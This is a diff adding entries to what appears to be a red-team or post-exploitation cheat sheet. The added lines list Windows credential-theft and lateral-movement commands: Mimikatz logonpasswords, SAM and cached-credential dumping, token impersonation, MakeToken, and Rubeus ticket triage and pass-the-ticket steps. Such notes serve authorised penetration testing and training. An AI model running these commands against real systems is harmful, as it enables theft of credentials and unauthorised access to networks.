@@ -62,6 +62,51 @@ Inject 1234
 #ViewDrives
 Seatbelt MappedDrives 
 
+#LogonPasswords SafetyKatz
+Mimikatz sekurlsa::logonpasswords
+ntlm
+
+#Security Account Manager
+Mimikatz token::elevate lsadump::sam
+
+#Token Impersonation
+ImpersonateProcess and ImpersonateUser
+RevToSelf.
+
+#Domain Cached Credentials
+Mimikatz token::elevate lsadump::cache
+$DCC2$<iterations>#<username>#<hash>
+
+#MakeToken
+MakeToken user domain pass
+
+#Overpass-the-Hash
+Rubeus triage
+Repair ticketbase64 in on line
+MakeToken user domain basspass
+Rubeus triage
+Rubeus ptt /ticket:<base64-encoded-ticket>
+Rubeus triage 
+Rubeus triage
+
+#Process Injection
+Inject
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
 
  
 
